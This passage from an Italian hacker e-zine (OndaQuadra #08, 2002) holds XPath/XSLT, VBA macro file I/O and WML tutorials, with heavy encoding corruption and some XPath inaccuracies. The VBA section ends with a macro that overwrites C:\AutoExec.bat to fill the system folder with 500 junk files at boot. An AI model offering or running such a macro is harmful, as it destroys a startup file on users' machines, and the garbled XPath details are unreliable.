| - di esportare i dati in un formato noto, come HTML o PDF.               |
| - di adattare i dati a diversi dispositivi di visualizzazione (vedasi    |
|   HTML e WML).                                                           |
|                                                                          |
| Bene... dopo aver detto questo, analizziamo un p≥ le XPath!! cosa dire   |
| in proposito,Φ un linguaggio che permette di indirizzare parti di un     |
| documento XML. XPath dispone anche di primitive per eseguire semplici    |
| operazioni su stringhe, numeri e valori booleani.Inoltre, le             |
| espressioni XPath possono avere come valore numeri, stringhe, booleani   |
| e insiemi di nodi.ok? Dal punto di vista di XPath, il documento XML Φ    |
| un albero... ogni elemento, commento, attributo, PI o stringa di testo   |
| (non-markup) Φ un nodo dellÆalbero capito il concetto? andiamo           |
| avanti... Le relazioni tra i nodi sono semplici:                         |
|                                                                          |
| - Un elemento nidificato Φ un nodo figlio dellÆelemento che lo           |
|   contiene.                                                              |
| - Un attributo Φ figlio del suo elemento.                                |
| - Commenti e PI e testo sono figli dellÆelemento che li contiene (o      |
|   del documento*).                                                       |
|                                                                          |
| Allora ragazzi ci tengo a precisare che per scrivere queste poche        |
| righe ci ho messo 2 giorni, dato il fatto che sul manule che tengo io,   |
| questi concetti sono espressi in 16 pagine hihihihhihihi vabbΦ a voi     |
| va un p≥ meglio! comunque vorrei esprimere un mio parere, qua pi∙        |
| andiamo avanti pi∙ diventa difficile! ma non ci demoralizziamo,          |
| dopotutto chi si arrende Φ perduto :) CONTINUIAMO!! Volete sapere come   |
| si intitola il prossimo paragrafetto? ora subito ve lo dico ....         |
| XPath: Gli Assi vi interessa? spero di si perchΦ adesso sto per          |
| cominciare a spiegare rimanendo in tema dell'albero, i rami e i figli,   |
| diciamo che muovendosi sullÆalbero del documento, XPath permette di      |
| scegliere non solo tra i figli del nodo corrente, ma anche tra una       |
| serie di altri insiemi di nodi che sono in relazione con esso. ok?       |
| Questi insiemi di nodi si dicono assi. Ogni passo di una espressione     |
| XPath pu≥ avvenire su un asse arbitrario a partire dal nodo corrente     |
| (o contesto).LÆasse degli elementi figli diretti Φ lÆasse predefinito,   |
| ed esistono scorciatoie per raggiungere lÆasse degli attributi:          |
|                                                                          |
| - ancestor >> Contiene il padre del nodo, il padre del padre, eccà       |
|                                                                          |
| - ancestor-or-self >> Come ancestor, ma contiene anche il nodo           |
|   corrente.                                                              |
|                                                                          |
| - attribute >> Contiene gli attributi del nodo corrente.                 |
|                                                                          |
| - child >> Contiene gli elementi direttamente nodificati nel nodo        |
|            corrente.                                                     |
|                                                                          |
| - descendant >> Contiene tutti gli elementi nidificati nel nodo          |
|                 corrente (con livello di nidificazione arbitrario).      |
|                                                                          |
| - descendant-or-self >> Come descendant, ma contiene anche il nodo       |
|                         corrente.                                        |
|                                                                          |
| - following >> Contiene tutti i nodi che si trovano dopo quello          |
|                corrente allÆinterno del documento, esclusi i             |
|                discendenti, gli attributi del nodo e i namespaces.       |
|                                                                          |
| - following-sibling >> Contiene tutti i nodi che hanno lo stesso         |
|                        livello di nidificazione nellÆelemento padre      |
|                        di quello corrente e sono posti dopo di esso      |
|                        (ôfratelliö).                                     |
|                                                                          |
| - namespace >> Contiene i nodi namespaces dichiarati per lÆelemento      |
|                corrente.                                                 |
|                                                                          |
| - parent >> Contiene il padre dellÆelemento corrente.                    |
|                                                                          |
| - preceding >> Contiene tutti i nodi che si trovano prima quello         |
|                corrente allÆinterno del documento, esclusi i suoi        |
|                antenati (ancestors), gli attributi del nodo e i          |
|                namespaces.                                               |
|                                                                          |
| - preceding-sibling >> Contiene tutti i nodi che hanno lo stesso         |
|                        livello di nidificazione nellÆelemento padre      |
|                        di quello corrente e sono posti prima di esso.    |
|                                                                          |
| - self >> Contiene il nodo corrente.                                     |
|                                                                          |
| Se posso darvi un consiglio memorizzate questo schema che vi ho fatto    |
| perchΦ non se ne trovano molti on-line :) dopodichΦ continuiamo          |
| Allora ragazzi... per individuare un particolare nodo su un asse, si     |
| usano il suo tipo e/o il suo nome tramite i cosiddetti node tests. In    |
| entrambi i casi, il risultato pu≥ anche essere un insieme di nodi, nel   |
| caso sullÆasse siano disponibili pi∙ nodi con lo stesso tipo e/o nome.   |
| Nel caso si lavori su un insieme di nodi, tutte le operazioni vengono    |
| applicate iterativamente a ciascun nodo, e il risultato Φ lÆinsieme      |
| dei nodi risultanti dalle applicazioni... allora,i tipi di nodo sono     |
| i seguenti:                                                              |
|                                                                          |
| . elemento                                                               |
| . attributo                                                              |
| . namespace                                                              |
| . commento                                                               |
| . processing-instruction                                                 |
|                                                                          |
| Inoltre, ogni asse ha un tipo predefinito:                               |
|                                                                          |
| - se lÆasse contiene elementi, il tipo predefinito Φ ôelementoö          |
| - se lÆasse non contiene elementi ma contiene attributi, il tipo         |
|   predefinito Φ ôattributoö                                              |
| - se lÆasse non contiene elementi ma contiene namespaces, il tipo        |
|   predefinito Φ ôattributoö                                              |
| Insomma ragazzi il ragionamento Φ molto semplice :) ... adesso se voi    |
| pemettete, possiamo continuare a studiare hihihiih                       |
| Per indicare tutti i nodi con un particolare tipo, si usano opportuni    |
| test:                                                                    |
|                                                                          |
| comment()                                                                |
| node()                                                                   |
| processing-instruction()                                                 |
| text()                                                                   |
|                                                                          |
| I test restituiscono lÆinsieme dei nodi con quel particolare tipo        |
| presenti sullÆasse. Il risultato Φ un insieme di nodi, ciascuno dei      |
| quali pu≥ essere ulteriormente attraversato usando XPath... ok?          |
|                                                                          |
| Bene bene, ragazzi non ci crederete ma siamo a buon punto... la          |
| prossima cosa che andiamo ad analizzare sono i nomi... cosa significa?   |
| vediamo un p≥: alcuni nodi possiedono anche un loro nome: i nodi         |
| elemento e attributo hanno il nome dellÆelemento e dellÆattributo        |
| stessi... so che pu≥ sembrare pi∙ chimica che informatica ma una         |
| volta capito il concetto Φ sempre lo stesso!! Per indicare il nodo       |
| con un particolare nome, si usa semplicemente il nome stesso come        |
| test. Lo speciale test æ*Æ fa match con tutti i nodi accessibili         |
| sullÆasse, con qualunque nome.I test restituiscono lÆinsieme dei nodi    |
| con quel particolare nome presenti sullÆasse!!                           |
| ok... passiamo adesso agli step :) non vi preoccupate non Φ niente di    |
| mostruoso... Una espressione XPath consiste in una serie di step         |
| (ôpassiö) costituiti da node tests, ognuno su un proprio asse,           |
| separati da uno slash æ/Æ, in maniera simile agli URI.                   |
|                                                                          |
| collezione/node()/cd/artista                                             |
| Ogni passo agisce sullÆinsieme di nodi (contesto) ottenuto dal passo     |
| precedente. Il primo passo ha un contesto fornito dallÆ ôambienteö,      |
| o la radice del documento se il path inizia esso stesso con uno          |
| slash.                                                                   |
|                                                                          |
| /collezione/cd/artista                                                   |
| Negli esempi proposti prima lÆasse di movimento era sempre quello di     |
| default (child). Per muoversi su un altro asse, basta prefissare il      |
| nome del nodo con il nome dellÆasse:                                     |
|                                                                          |
| collezione/descendant::cd/attribute::ID                                  |
| Esistono delle scorciatoie per i tre assi pi∙ usati:                     |
|                                                                          |
| descendants::  si abbrevia con uno slash æ/Æ (/descendants:: si          |
|                scrive // )                                               |
|                                                                          |
| attribute:: si abbrevia con una chiocciola æ@Æ                           |
|                                                                          |
| self:: si abbrevia con un punto æ.Æ                                      |
|                                                                          |
| collezione//cd/@ID                                                       |
|                                                                          |
| hhahahaha qui la situazione Φ diventata critica per molti di voi, ne     |
| sono sicuro, soprattutto se siete alle prime armi!! ma non ve ne fate    |
| un problema, rileggetelo un paio di volte e la difficoltα svanisce :)    |
| consigli d'autore... dovrei farmi pagare hhihihihihi ... quando avete    |
| capito quanto riportato qui in alto possiamo continuare nei nostri       |
| studi :)                                                                 |
| XPath: I Filtri                                                          |
| - I Filtri agiscono sugli insiemi di nodi, selezionandone una parte      |
|   secondo particolari criteri.                                           |
| - Il risultato di un filtro Φ lÆinsieme dei nodi filtrati.               |
| - In ciascuno step si possono inserire un numero arbitrario di filtri,   |
|   che vengono richiamati nellÆordine in cui si presentano.               |
| - I filtri vanno posti nello step sempre dopo il suo node test.          |
| - AllÆinterno del filtro si possono usare espressioni che abbiano        |
|   valore booleano (vero / falso).                                        |
| - LÆespressione del filtro viene valutata usando ciascun nodo del set    |
|   come contesto,e se vale true il nodo viene aggiunto allÆinsieme dei    |
|   risultati.                                                             |
| - Esistono due eccezioni:                                                |
|   .  Se lÆespressione restituisce un numero, viene selezionato il nodo   |
|      in quella posizione nellÆinsieme (gli insiemi di nodi sono          |
|      ordinati).                                                          |
|   .  Se lÆespressione restituisce un insieme di nodi, allora vale true   |
|      se lÆinsieme non Φ vuoto.                                           |
|                                                                          |
| AllÆinterno dei filtri si possono usare come operandi:                   |
|                                                                          |
| -Espressioni XPath (compresi altri filtri nidificati!), che vengono      |
|  valutate usando come contesto ciascun nodo dellÆinsieme di input.       |
| -Il ôvaloreö di una espressione XPath, se usata con operatori di         |
|  confronto, Φ il testo in essa contenuto (valore dellÆattributo o        |
|  testo allÆinterno dellÆelemento). Se lÆespressione Φ un insieme,        |
|  XPath restituisce true se cÆΦ almeno un suo elemento che soddisfi il    |
|  test.                                                                   |
| -Costanti numeriche o stringhe tra virgolette.                           |
|                                                                          |
| Ma soprattutto ragazzi, si possono usare vari operatori e qui viene      |
| il bello :)                                                              |
|                                                                          |
| Confronto                                                                |
|                                                                          |
| æ=Æ (uguale), æ!=Æ (diverso), æ>Æ (maggiore), æ>=Æ (maggiore o           |
| uguale),                                                                 |
| æ<Æ (minore), æ<=Æ (minore o uguale).                                    |
|                                                                          |
| Logici                                                                   |
|                                                                          |
|  and, or, not(à)                                                         |
|                                                                          |
| Insiemistici                                                             |
|                                                                          |
| æ|Æ (unione).                                                            |
|                                                                          |
| Raggruppamento                                                           |
|                                                                          |
| æ(à)Æ                                                                    |
|                                                                          |
| Matematici                                                               |
|                                                                          |
|  æ+Æ, æ-Æ, æ*Æ, æ/Æ, mod                                                 |
|                                                                          |
| Ci siamo capiti?!? Spero bene... perchΦ sinceramente pi∙ andiamo         |
| avanti in questo studio, io pi∙ mi esaurisco!! spero voi non siate       |
| come me!! l'unica cosa che mi spinge a continuare a scrivere notte e     |
| giorno, Φ il fatto che un giorno o l'altro voi leggerete questo          |
| tutorial!! hihihihi ok non perdiamoci in inutili parole e analizziamo    |
| ancora questo "linguaggio" ... ora proporrei di vederne le struttura     |
| ok? ke ne dite? duqnue un documento XSLT, come ogni documento XML,       |
| inizia con una dichiarazione XML.                                        |
| <?xml version="1.0" encoding="UTF-8"?>                                   |
| ok ci siamo, se il documento deve emettere HTML o un altro linguaggio,   |
| bisogna dichiarare entrambi i namespaces. Di solito il linguaggio        |
| target viene usato come default namespace, quindi tutti gli elementi     |
| XSLT vanno prefissati con il loro namespace (xsl:) e fin qui direi       |
| che Φ tutto chiaro giusto? ma passiamo a vedere un p≥ i Template...      |
| un template Φ una subroutine di trasformazione. LÆXPath fornito          |
| dallÆattributo match viene usato per filtrare il contesto: tutti i       |
| nodi filtrati vengono elaborati nel template.                            |
| &lt;template match="song">...&lt;/template>                                    |
| semplice vero? Ogni stylesheet (root) deve avere un template con         |
| match=ô/ö, la sua procedura main, che viene chiamata allÆavvio con       |
| tutto il documento come insieme di nodi. &lt;template match="/">            |
| ok si pu≥ fare... continuiamo pure ... naturalmente, un template pu≥     |
| venir chiamato da un altro in due modi: per nome o per selezione         |
|                                                                          |
| in questo modo richiama il template con lÆattributo name dato. In        |
| questo caso lÆattributo match del template Φ ignorato.                   |
| &lt;call-template name="..."/>                                              |
|                                                                          |
| in quest'altro, richiama il template che fa match con i nodi             |
| selezionati da e nel contesto corrente (opzionale) e con attributo       |
| mode uguale a quello dato (opzionale).                                   |
| &lt;apply-templates select="e" mode="m"/>                                   |
|                                                                          |
| ok... tutto comprensibile fin ora!! direi che si pu≥ proseguire :)       |
| passiamo adesso agli Output di Valori: Per trascrivere nel documento     |
| di output i valori dei nodi XML si usa la funzione                       |
| &lt;value-of select="e"/>                                                   |
| "e" Φ un XPath. Il valore del suo risultato, come definito nella         |
| specifica XPath, viene trascritto nel documento.                         |
|                                                                          |
| Per quanto riguarda invece gli Output di Markup tutto quello che         |
| dobbiamo dire Φ che: tutto ci≥ che non Φ un elemento XSLT nel foglio     |
| di stile viene copiato in output quando il parser lo incontra. In        |
| questo modo Φ possibile inserire markup HTML o di un altro linguaggio    |
| direttamente nello stylesheet e che se il valore di un attributo o       |
| il nome di un elemento devono essere generati dinamicamente (in base     |
| al contenuto del documento), si possono usare gli elementi               |
| &lt;attribute name="nome">àvaloreà&lt;/attribute>                              |
| &lt;element name="{espressione}">àvaloreà&lt;/element>                         |
|                                                                          |
| Ragazzi, sono lieto di affermare che abbiamo quasi finito :) ci          |
| rimangono da analizzare soltanto l'Iterazione e l'Applicazione           |
| condizionale quindi scorciamoci le maniche e diamoci da fare ci siamo    |
| quasi. Per iterare sugli elementi di un insieme di nodi Φ disponibile    |
| la funzione:                                                             |
| &lt;for-each select="xpath">...&lt;/for-each>                                  |
|                                                                          |
| Il frammento di stylesheet allÆinterno dellÆelemento viene applicato     |
| a tutti i nodi selezionati dallÆXPath specificato.EÆ possibile           |
| ordinare lÆinsieme dei nodi prima di applicarvi il frammento di          |
| stylesheet inserendo, immediatamente dopo il tag di apertura (anche      |
| nelle chiamate ai template), elementi del tipo:                          |
| &lt;sort select= "xpath-ordinamento" order="ascending"/>                    |
|                                                                          |
| Per quanto riguarda le applicazioni condizionali, diciamo che esistono   |
| due costrutti XSLT che consentono di eseguire frammenti di stylesheet    |
| solo se particolari condizioni sono vere.                                |
| &lt;if test="xpath-filter">...&lt;/if>                                         |
|                                                                          |
| AllÆinterno dellÆattributo test valgono le regole dei filtri di XPath.   |
| Se il filtro ha valore vero, il frammento di stylesheet contenuto        |
| nellÆelemento if viene eseguito. In caso contrario, tutto il             |
| contenuto dellÆelemento viene ignorato.                                  |
|                                                                          |
| &lt;choose>                                                                 |
| &lt;when test="xpath-filter">à&lt;/when>                                       |
| ...                                                                      |
| &lt;otherwise>à&lt;/otherwise>                                                 |
| &lt;/choose>                                                                |
|                                                                          |
| Ragazzi... direi che pure questo tutorial Φ finito :( comunque se        |
| posso dare la mia opinione, a me Φ piaciuto fare un viaggetto in XSLT,   |
| almeno Φ una cosa diversa dai soliti linguaggi di programmazione,        |
| giusto? Che dirvi io per scriverlo ci ho messo poco tempo, spero che     |
| voi lo digeriate abbastanza velocemente! VAbbΦ ragazzi... adesso vi      |
| saluto :) ciao a tutti vi aspetto al prossimo tutorial                   |
+--------------------------------------------------------------------------+


+--------------------------------------------------------------------------+
| ONDAQUADRA ~ C0DiNG                                     #08 - 01/11/2002 |
| PLUS #2                                               [Mastro] 0x0C/0x1A |
+--------------------------------------------------------------------------+
| Spero che lo scorso "fuoripista" sia stato interessante.                 |
| Proseguiamo.                                                             |
|                                                                          |
| --- MANIPOLIAMO ---                                                      |
|                                                                          |
| Prima di tutto mi scuso con i newbies se qualche passaggio non era       |
| chiaro, cercher≥ di semplificare il tutto..                              |
|                                                                          |
| Modificare file da macro?                                                |
| Possibile. Basta utilizzare il comando Open.                             |
|                                                                          |
| Open "Nome e percorso del file" For "Modalitα" As "#Numero del file"     |
|                                                                          |
| Nome e percorso del file => Credo proprio che la spiegazione non serva   |
| Modalitα => Potete aprire i file in 5 modi: Append (apre e scrive alla   |
| fine del file), Binary (scrive in un file giα aperto), Input(idem come   |
| Binary), Output (apre e sovrascrive il file) e Random (idem come Input,  | 
| ma lo apre in modo casuale).                                             |
| #Numero del file => Bisogna assegnare un numero al file che desiderate   |
| aprire. Decidetelo voi da 1 a 511.                                       |
| Nel caso che vogliate essere sicuri di non sbagliare, per trovare un     |
| numero disponibile, basta utilizzare FreeFile:                           |
|                                                                          |
| ----------                                                               |
| Numero = FreeFile                                                        |
| Open "Qualcosa" For Append As #Numero                                    |
| ----------                                                               |
|                                                                          |
| Attenzione: con Input/Binary/Random si pu≥ aprire un file giα aperto     |
| senza generare errore, invece Append/Output necessitano della chiusura   |
| del file prima di poterlo riaprire.                                      |
| Non era molto chiaro. Esempio:                                           |
|                                                                          |
| ----------                                                               |
| Open "Pippo" For Input As #1                                             |
| Open "Pippo" For Random As #2 'Non dα errore                             |
|                                                                          |
| Open "Pippo" For Output As #1 'Dα errore ("File giα aperto"),            |
| bisogna prima chiudere il file                                           |
| Open "Pippo" For Append As #1                                            |
| ----------                                                               |
|                                                                          |
| Vi sono anche dei comandi aggiuntivi opzionali che ho omesso:            |
|                                                                          |
| Open "Nome e percorso del file" For "Modalitα" [Access "Tipo di          |
| accesso"] [Bloccaggio] As "#Numero del file" [Len = "Lunghezza"]         |
|                                                                          |
| Tipo di accesso => Dichiara le operazioni consentite nel file aperto.    |
| Read (leggi), Write(scrivi) e Read Write(leggi e scrivi).                |
| Bloccaggio => Dichiara le operazioni consentite da altri processi        |
| mentre il file Φ aperto dalla macro. Shared (condiviso), Lock Read       |
| (blocca la lettura), Lock Write (blocca la scrittura) e Lock Read Write  | 
| (blocca lettura e scrittura).                                            |
| Lunghezza => Lunghezza del file da aprire.                               |
|                                                                          |
| Comunque tutte queste opzioni sono facoltative quindi non ci sono        |
| problemi anche se le omettete.                                           |
| Ma passiamo alla scrittura vera e propria con Print.                     |
| Semplicissimo, si assegna la scrittura di un determinato valore ad un    |
| file in base al numero che gli abbiamo affibbiato precedentemente.       |
|                                                                          |
| Print #Numero del file, "Quello che volete scriverci"                    |
|                                                                          |
| Quindi riassumendo:                                                      |
|                                                                          |
| ----------                                                               |
| Open "Prova.txt" For Output As #1     'Lo apriamo in modalitα            |
| sovrascrittura. #Numero 1 (assegnato a caso)                             |
| Print #1, "Ha funzionato?"            'Ci scriviamo                      |
| Print #1, "Credo proprio di si."                                         |
| Close #1                              'Chiudiamo il file in base al      |
| numero                                                                   |
| ----------                                                               |
|                                                                          |
| Dimenticavo di dire che se il file non esiste viene creato in            |
| automatico nel percorso e con il nome che gli avete assegnato.           |
| Se non chiudete il file le modifiche non verranno salvate.               |
| Print supporta altri 2 comandi: Tab(numero) e Spc(numero). Molto         |
| semplicemente il primo equivale alla pressione del tasto TAB per         |
| un "numero" di volte, il secondo alla pressione della barra spaziatrice  | 
| per "numero" volte.                                                      |
| Cercate di non dimenticare la virgola dopo Print, altrimenti dα errore.  |
| Mettiamo ora il caso che io non voglia modificare un file, ma leggerlo.  |
|                                                                          |
| ----------                                                               |
| Open "Prova.txt" For Input As #1        'Apro il file                    |
| Line Input #1, Valore 'Leggo i valori sulla                              |
| prima linea e li assegno ad una variabile di nome "Valore"               |
| MsgBox Valore 'Li visualizzo in una                                      |
| MessageBox                                                               |
| Close #1 'Chiudo il file                                                 |
| ----------                                                               |
|                                                                          |
| Line Input funziona solo in modalitα Input.                              |
| Ha lo stesso procedimento di Print, gli si assegna il numero del file    |
| da leggere ed una variabile che conterrα i dati.                         |
| Volendo esiste anche il comando Input #Numero, ma pi∙ o meno ha lo       |
| stesso effetto di Line Input.                                            |
| Se provate il comando noterete che la stringa letta Φ solo la prima del  | 
| file, per leggerlo totalmente?                                           |
|                                                                          |
| ----------                                                               |
| Open "Prova.txt" For Input As #1        'Apro il file                    |
| Do While Not EOF(1)     'Lo leggo fino a che non                         |
| arriva alla fine                                                         |
| Input #1, Valore     'Memorizzo i dati nella                             |
| variabile "Valore"                                                       |
| MsgBox Valore     'Li visualizzo.                                        |
| Loop 'Ripeti il ciclo                                                    |
| Close #1 'Chiudo il file                                                 |
| ----------                                                               |
|                                                                          |
| EOF(Numerofile) => Restituisce un valore che indica se Φ stata           |
| raggiunta la fine del file.                                              |
| Forse non avete chiara la funzione Do..Loop: esegue un'operazione fino   |
| a che una condizione non Φ verificata.                                   |
|                                                                          |
| ----------                                                               |
| i = 1 'Assegno a "i" valore 1                                            |
| Do Until i = 5 'Ripete il ciclo fino a                                   |
| che i non arriva a 5                                                     |
| MsgBox "Siamo a " & i 'Evento da eseguire nel                            |
| ciclo                                                                    |
| i = i + 1 'Incremento i                                                  |
| Loop 'Ripeto il ciclo                                                    |
| MsgBox "Siamo a " & i & ". Fine!" 'Quando i = 5 il ciclo si arresta.     |
| ----------                                                               |
|                                                                          |
| Da notare che alla fine del ciclo "i" non cambia il proprio valore in 1  | 
| o si annulla, ma mantiene l'ultimo fissato (5).                          |
| Se omettete "Until condizione" il ciclo verrα ripetuto all'infinito.     |
| Tornando alla lettura del file, ora siamo in grado di leggerlo riga per  | 
| riga.                                                                    |
| Prima di terminare occorre un piccolo approfondimento su Print# e        |
| Write#: la differenza principale Φ che il secondo viene utilizzato per   |
| scrivere in un file i caratteri letti con l'istruzione Input#.           |
| La spiegazione Φ finita, spero di essere stato chiaro anche per i meno   |
| esperti.                                                                 |
| Un'ultima cosa: ecco un esempio delle cose che potete fare grazie a      |
| questi comandi.                                                          |
|                                                                          |
| ----------                                                               |
| Open "C:\AutoExec.bat" For Output As #1                                  |
| 'Apro AutoExec in sovrascrittura                                         |
| Print #1, "@echo off"                                                    |
| 'Ci scrivo                                                               |
| Print #1, "pause"                                                        |
| Print #1, "cd c:\windows\system"                                         |
| For i = 1 To 500                                                         |
| 'Questo non viene scritto nel file                                       |
| Print #1, "echo Brothers Everywhere, Raise Your Hands Into The Air,      |
| We're Warriors, Warriors Of The World>" & i & ".txt" 'Questo s∞. Fino a  | 
| che "i" non arriva a 500.                                                |
| Next i                                                                   |
| 'Poi                                                                     |
| Close #1                                                                 |
| 'Chiudo il file                                                          |
| ----------                                                               |
|                                                                          |
| Piccole spiegazioni:                                                     |
| "@echo off" => non visualizza i comandi nella schermata                  |
| "pause" => mette in pausa il sistema.                                    |
| "cd c:\windows\system" => ci fa "entrare" nella directory system.        |
| "echo qualcosa>altro" => per chi non lo sapesse crea un file             |
| chiamato "altro" scrivendoci all'interno "qualcosa". Se fosse            |
| stato "@echo pippo >> topolino.txt" avrei scritto "pippo" nel            |
| file "topolino.txt" SENZA sovrascriverlo.                                |
| In questo caso avremo 1.txt, 2.txt, 3.txt, ecc.. fino a 500.txt.         |
|                                                                          |
|                                                                          |
| Mastro(macro2000@virgilio.it)                                            |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ C0DiNG                                     #08 - 01/11/2002 |
| iMPARiAM0 iL LiNGUAGGi0 WML                        [cyberdude] 0x0D/0x1A |
+--------------------------------------------------------------------------+
| IMPARIAMO IL LINGUAGGIO WML                                              |
|                                                                          |
| BY CYBERDUDE                                                             |
|                                                                          |
|  >>> PRESENTAZIONE TUTORIAL SUL LINGUAGGIO WML BY CYBERDUDE              |
|                                                                          |
| Benissimo ragazzià so come sia palloso mettersi a leggere infinite       |
| pagine per imparare un linguaggio di programmazione, scripting o         |
| qualsiasi altro sia, ed eÆ per questo che proveroÆ a spiegarvi un        |
| intero linguaggio in pochissime pagine, 13 mi sembra,  rendendovi la     |
| vita piuÆ facile e spero me ne siate grati!!                             |
| Adesso non perdiamoci in inutili parole e iniziamo subito il nostro      |
| studio del linguaggio WML                                                |
|                                                                          |
| -----------------------------------------------------------------------  |
|                                                                          |
| .:: INDICE ::.                                                           |
|                                                                          |
| COS'E' IL WML? CARATTERISTICHE FONDAMENTALI                              |
| LA SINTASSI DEL WML                                                      |
| FORMATTAZIONE                                                            |
| PRIMO DECK WML                                                           |
| IL TAG "DO"                                                              |
| LINK e COLLEGAMENTI                                                      |
| TEMPLATE e TIMER                                                         |
| LE IMMAGINI IN WML                                                       |
| LE VARIABILI                                                             |
| DECK: UN ESEMPIO COMPLETO                                                |
| FORM INPUT DELL'UTENTE. Parte 1                                          |
| FORM INPUT DELL'UTENTE. Parte 2                                          |
| BEH DIREI CHE 12 PARAGRAFETTI POSSONO BASTARE HIHIHIHHIHIHI :)           |
| -----------------------------------------------------------------------  |
|                                                                          |
| 1 >>> COS'E' IL WML? CARATTERISTICHE FONDAMENTALI                        |
|                                                                          |
| Allora ragazzià Il Wireless Markup Language Θ il linguaggio con cui      |
| vengono progettate le pagine WAP. Sia il linguaggio WML che il           |
| linguaggio HTML derivano dal XML (Extensible Markup Language) e ne       |
| ereditano le principali caratteristiche. Ok? Il WML Φ stato progettato   |
| su telefoni cellulari che hanno le seguenti caratteristiche:             |
|                                                                          |
| display di dimensioni limitate e con bassa risoluzione;                  |
| limitate capacitα di input (un telefonino ha tipicamente una tastiera    |
| numerica e qualche tasto funzione);                                      |
| limitate capacitα di elaborazione perchΘ dotati di microprocessori a     |
| basso consumo e poca memoria;                                            |
| la rete cui sono collegati offre una banda ristretta e con tempi di      |
| attesa lunghi.                                                           |
| Diciamo quindi quasi una kiavica ihihihhihihihi :)                       |
|                                                                          |
| Un utente naviga attraverso un insieme di pagine, dette card , i deck    |
| (sarebbero i comandi) WML possono essere memorizzati in un file          |
| statico o in un server di origine o possono essere generati              |
| dinamicamente dal server o da un generatore di contenuto. Il micro-      |
| browser , peroÆ, deve decidere come presentare gli elementi presenti     |
| allÆinterno di una card in base alle caratteristiche del dispositivo     |
| stesso (se si ha a disposizione un display ampio si pu≥ scegliere di     |
| visualizzare tutte le informazioni della card, altrimenti le si          |
| frammenta in pi∙ unitα). I tag che identificano le istruzioni del        |
| linguaggio WML sono anch'essi racchiusi dai simboli '<' e '>' proprio    |
| come in HTML.  Il WML include inoltre le seguenti caratteristiche:       |
|                                                                          |
| Supporto per testi ed immagini: ampia libertα di scelta per quanto       |
| riguarda la rappresentazione dei dati allÆutente finale. Il WML          |
| fornisce diversi modi per formattare il testo (ad esempio grassetto,     |
| corsivo, maiuscole,...) e permette di inserire delle immagini.           |
| Supporto per lÆinput utente: WML supporta un option selection per        |
| presentarsi con una lista di opzioni selezionabili dallÆutente.          |
| Navigazione e Stack History: la navigazione include hyperlink stile      |
| HTML.                                                                    |
| Supporto internazionale: lÆinsieme dei caratteri presenti nei            |
| documenti WML Φ UNICODE.                                                 |
| Indipendenza dalla MMI (Man-Machine Interface).                          |
| Ottimizzazioni per connessioni a banda ristretta: Sono supportati una    |
| serie di meccanismi che velocizzano il tempo di risposta e               |
| diminuiscono la quantitα dei dati scambiati.                             |
| Gestione dello stato e del contesto: ogni controllo di input WML pu≥     |
| introdurre delle variabili. Lo stato delle variabili pu≥ essere          |
| utilizzato per modificare il contenuto o parametrizzare una card senza   |
| dover comunicare con il server.                                          |
| La pagina WML Θ detta deck Θ composto da pi∙ carte. La card              |
| rappresenta la singola unitα di navigazione che viene visualizzata dal   |
| browser sul display del telefonino WAP, pi∙ card possono essere          |
| raggruppate in un deck, il deck Θ la minima unitα che viene scaricata    |
| dal WAP Server al telefonino. Ogni qualvolta si richiede una "pagina"    |
| WML ad un WAP Server, questo invierα al browser tutto il deck,           |
| composto di una o pi∙ card, e poi ne visualizzerα la prima.              |
|                                                                          |
| Alcuni telefonini non accettano un deck pi∙ grande di 1.4 Kbytes. Il     |
| WAP gateway comprime il vostro WML in un formato binario pi∙ compatto,   |
| ma non pu≥ fare miracoli.                                                |
|                                                                          |
| Un primo e molto semplice esempio di pagina WML:                         |
|                                                                          |
| <?xml version="1.0"?>                                                    |
| <!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD WML 1.1//EN"                      |
| "http://www.wapforum.org/DTD/wml_1.1.xml">                               |
| &lt;wml>                                                                    |
| &lt;card id="ciao" title="ciao">                                            |
|    &lt;p>                                                                   |
|       Ciao&lt;br/>                                                          |
|       Questa e' una card in WML.                                         |
|    &lt;/p>                                                                  |
| &lt;/card>                                                                  |
| &lt;/wml>                                                                   |
|                                                                          |
|                                                                          |
|                                                                          |
|  2 >>> LA SINTASSI DEL WML                                               |
|                                                                          |
| TAG                                                                      |
| I tag sono i descrittori del linguaggio WML. Il tag descrive un          |
| elemento della pagina WML; Θ definito da un nome unico e da alcuni       |
| attributi specifici. Ciascun tag Θ racchiuso dai simboli '<' e '>'.      |
| HTML permette di inserire una interruzione di linea con il tag &lt;br>      |
| mentre il linguaggio WML richiede necessariamente una delle due forme    |
| equivalenti: &lt;br>&lt;/br> o &lt;br/>.                                          |
|                                                                          |
| ELEMENTO                                                                 |
|                                                                          |
| specifica le informazioni sia strutturali che di markup di un deck       |
| WML. Possono essere formati da uno start tag, un contenuto specifico,    |
| opzionalmente altri elementi quindi un end tag; con la seguente          |
| struttura:                                                               |
|                                                                          |
| &lt;tag>contenuto&lt;/tag>                                                     |
|                                                                          |
| oppure                                                                   |
|                                                                          |
| &lt;tag/>                                                                   |
|                                                                          |
| ATTRIBUTO                                                                |
|                                                                          |
| inclusi all'interno dello start tag, di questi alcuni sono obbligatori   |
| e vanno sempre indicati, altri invece possono essere opzionali e         |
| omessi se non necessari. Il valore dell'attributo deve sempre essere     |
| racchiuso tra apici, singoli (') oppure doppi ("), mentre due            |
| attributi vanno separati ricorrendo ad uno spazio.                       |
|                                                                          |
| &lt;tag attr="valore"/>                                                     |
|                                                                          |
| CARATTERI "SPECIALI"                                                     |
|                                                                          |
| ad esempio i due caratteri < e > che nel testo possono essere            |
| utilizzati solo ed esclusivamente per circoscrivere un tag. Esistono     |
| per≥ tre modi alternativi che permettono di specificare qualunque        |
| carattere del set tramite un formato unico ed indipendente:              |
|                                                                          |
|                                                                          |
|                                                                          |
| CARATTERE  MNEMONICO                                                     |
|                                                                          |
|    ô        "                                                            |
|                                                                          |
|    &        &                                                            |
|                                                                          |
|    æ        &apos;                                                       |
|                                                                          |
|    <        <                                                            |
|                                                                          |
|    >        >                                                            |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
| INTESTAZIONE DOCUMENTO                                                   |
| Tutte le pagine WML devono includere la definizione di tipo XML come     |
| prima riga:                                                              |
|                                                                          |
| <?xml version="1.0"?>                                                    |
| <!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD wml                               |
| 1.1//EN" "http://www.wapforum.org/DTD/wml_1.1.xml">                      |
|                                                                          |
| La prima riga indica la versione XML che si intende utilizzare, mentre   |
